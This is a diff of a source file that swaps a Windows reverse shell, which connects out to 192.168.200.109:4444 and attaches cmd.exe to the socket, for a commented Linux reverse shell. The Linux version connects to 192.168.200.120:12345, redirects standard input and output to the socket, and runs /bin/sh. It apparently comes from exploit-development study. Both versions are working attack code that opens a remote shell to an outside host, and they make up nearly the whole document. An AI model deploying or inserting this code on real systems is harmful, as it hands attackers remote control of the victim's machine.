@@ -1,46 +1,36 @@
-#include <Winsock2.h>
-#include <Windows.h>
-#include <iostream>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdlib.h>
 
-
-int main () 
+int main()
 {
+	// Create the socket (man socket)
+	// AF_INET for IPv4
+	// SOCK_STREAM for TCP connection
+	// 0 leaves it up to the service provider for protocol, which will be TCP 
+	int host_sock = socket(AF_INET, SOCK_STREAM, 0);
 
-std::string rem_host = "192.168.200.109";
-int rem_port = 4444;
+	// Create sockaddr_in struct (man 7 ip)
+	struct sockaddr_in host_addr;
 
-WSADATA wsaData;
+	// AF_INET for IPv4
+	host_addr.sin_family = AF_INET;
+	
+	// Set connect port number to 1234, set to network byte order by htons
+	host_addr.sin_port = htons(12345);
 
-// Call WSAStartup()
-int WSAStartup_Result = WSAStartup(MAKEWORD(2,2), &wsaData);
-if (WSAStartup_Result != 0) {
-    std::cout << "[-] WSAStartup failed.";
-    return 1;
+	// IP to connect to, set to network byte order by inet_addr
+	host_addr.sin_addr.s_addr = inet_addr("192.168.200.120");
+	
+	// Connect socket (man connect)
+	connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
+		
+	// Loop to redirect STDIN, STDOUT, and STDERR
+	int i;
+	for(i=0; i<=2; i++) 
+		dup2(host_sock, i);
+	
+	// Execute /bin/sh (man execve)
+	execve("/bin/sh", NULL, NULL);
+
 }
-
-// Call WSASocket()
-SOCKET mysocket = WSASocketA(2, 1, 6, NULL, 0, NULL); 
-
-// Create sockaddr_in struct
-struct sockaddr_in sa;
-sa.sin_family = AF_INET;
-sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
-sa.sin_port = htons(rem_port);
-
-// Call connect()
-int connect_Result = connect(mysocket, (struct sockaddr*) &sa, sizeof(sa));
-if (connect_Result !=0 ) {
-    std::cout << "[-] connect failed.";
-    return 1;
-}
-
-// Call CreateProcessA()
-STARTUPINFO si;
-memset(&si, 0, sizeof(si));
-si.cb = sizeof(si);
-si.dwFlags = (STARTF_USESTDHANDLES);
-si.hStdInput = (HANDLE)mysocket;
-si.hStdOutput = (HANDLE)mysocket;
-si.hStdError = (HANDLE)mysocket;
-PROCESS_INFORMATION pi;
-CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
